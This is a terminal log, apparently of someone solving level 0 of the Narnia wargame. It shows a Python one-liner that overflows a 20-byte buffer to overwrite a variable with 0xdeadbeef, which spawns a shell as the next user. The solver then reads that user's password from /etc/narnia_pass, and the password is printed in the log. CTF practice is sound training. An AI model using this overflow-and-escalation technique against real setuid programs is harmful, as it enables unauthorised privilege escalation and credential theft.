narnia0@narnia:~$ ls
narnia0@narnia:~$ cd ..
narnia0@narnia:/home$ ls
narnia0  narnia1  narnia2  narnia3  narnia4  narnia5  narnia6  narnia7  narnia8  narnia9
narnia0@narnia:/home$ ls narnia0
narnia0@narnia:/home$ ls narnia1
narnia0@narnia:/home$ cd ..
narnia0@narnia:/$ ls
bin   cgroup2  etc   initrd.img      lib    lib64   lost+found  mnt     opt   README.txt  run   share  sys  usr  vmlinuz
boot  dev      home  initrd.img.old  lib32  libx32  media       narnia  proc  root        sbin  srv    tmp  var  vmlinuz.old
narnia0@narnia:/$ cd narnia
narnia0@narnia:/narnia$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: deadbeef
buf: deadbeef
val: 0x41414141
WAY OFF!!!!
narnia0@narnia:/narnia$ cat narnia0
ELF              `4   H      4           (      4   44               T  TT                                 ,  0                     h  hhD   D         Pt4   4         Qtd                          Rt            /lib/ld-linux.so.2           GNU                        GNU@|vʺ=UϤ
      
   K                <              J              .              C              d                             3              R                              libc.so.6 _IO_stdin_used exit __isoc99_scanf puts setreuid printf system geteuid __libc_start_main __gmon_start__ GLIBC_2.7 GLIBC_2.0                         }                        (          c  t  [         5    %h    %   %h   %h   %h    % h(   %$h0   %(h8   p%f        1^PTRhphQVh[fffffff$ffffff7-4v    tUh4ЃÐt& 4-4t    UPh4҃Ít& '    =4 u|4fu듍v     tUP҃uUSEAAAAh}hÆPEPhEPhކuh}ﾭu%SPh"hj    ]fffffffUWVSw  l$ )t%1    t$,t$,9[^_]Ív   Ã [     Correct val's value from 0x41414141 -> 0xdeadbeef! Here is your chance:  %24s buf: %s
 val: 0x%08x
D H   x   X]    AAAAN i$D(D,A0M GAAAA        l                                                                                             t                 o   |   ́
                          @            T   L          oo   o                                              ^C
narnia0@narnia:/narnia$ vim narnia0
narnia0@narnia:/narnia$ narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaaaaaaa
buf: aaaaaaaaaaaaaaaaaaaaaaaa
val: 0x61616161
WAY OFF!!!!
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaaaa
buf: aaaaaaaaaaaaaaaaaaaaaaa
val: 0x00616161
WAY OFF!!!!
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaa
buf: aaaaaaaaaaaaaaaaaaaa
val: 0x41414100
WAY OFF!!!!
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaadeadbeef!
buf: aaaaaaaaaaaaaaaaaaaadead
val: 0x64616564
WAY OFF!!!!
narnia0@narnia:/narnia$ python -c print'("a" * 20) + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ
val: 0xdeadbeef
narnia0@narnia:/narnia$ whoami
narnia0
narnia0@narnia:/narnia$ python -c print'("A" * 20) + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
narnia0@narnia:/narnia$ whoami
narnia0
narnia0@narnia:/narnia$ (python -c print'("A" * 20) + "\xef\xbe\xad\xde"'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
echo wtf
wtf
ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
cd ..
.
.
.
// Now to find where they hid the passwords.. 
.
.
.
cd /etc
ls
adduser.conf            cron.monthly            gdb          initramfs-tools  logcheck        narnia_pass     python3         selinux                    terminfo
adjtime                 crontab                 groff        inittab          login.defs      network         python3.5       services                   timezone
alternatives            cron.weekly             group        inputrc          logrotate.conf  NetworkManager  rc0.d           sgml                       tmpfiles.d
apache2                 dbus-1                  group-       insserv          logrotate.d     networks        rc1.d           shadow                     ucf.conf
apm                     debconf.conf            grub.d       insserv.conf     ltrace.conf     newt            rc2.d           shadow-                    udev
apparmor                debian_version          gshadow      insserv.conf.d   lvm             nsswitch.conf   rc3.d           shells                     ufw
apparmor.d              default                 gshadow-     iproute2         magic           ntp.conf        rc4.d           skel                       update-motd.d
apt                     deluser.conf            gss          issue            magic.mime      opt             rc5.d           ssh                        vim
bash.bashrc             devuan_version          hdparm.conf  issue.net        mailcap         os-release      rc6.d           ssl                        wgetrc
bash_completion         dhcp                    host.conf    kernel           mailcap.order   pam.conf        rc.local        staff-group-for-usr-local  X11
bash_completion.d       dictionaries-common     hostname     kernel-img.conf  manpath.config  pam.d           rcS.d           subgid                     xdg
bindresvport.blacklist  discover.conf.d         hosts        ldap             mime.types      passwd          reportbug.conf  subgid-                    xml
ca-certificates         discover-modprobe.conf  hosts.allow  ld.so.cache      mke2fs.conf     passwd-         resolv.conf     subuid
ca-certificates.conf    dpkg                    hosts.deny   ld.so.conf       modprobe.d      perl            rmt             subuid-
calendar                elogind                 identd.conf  ld.so.conf.d     modules         polkit-1        rpc             sudoers
ConsoleKit              emacs                   identd.key   libaudit.conf    motd            profile         rsyslog.conf    sudoers.d
console-setup           environment             inetd.conf   lighttpd         mtab            profile.d       rsyslog.d       supervisor
cron.d                  firewall                inetd.d      locale.alias     Muttrc          protocols       screenrc        sysctl.conf
cron.daily              fstab                   init         locale.gen       Muttrc.d        python          securetty       sysctl.d
cron.hourly             gai.conf                init.d       localtime        nanorc          python2.7       security        systemd
cd narnia_pass
ls
narnia0  narnia1  narnia2  narnia3  narnia4  narnia5  narnia6  narnia7  narnia8  narnia9
cat narnia0
cat: narnia0: Permission denied
cat narnia1
efeidiedae
.
.
.
// narnia1:efeidiedae
.
.
.
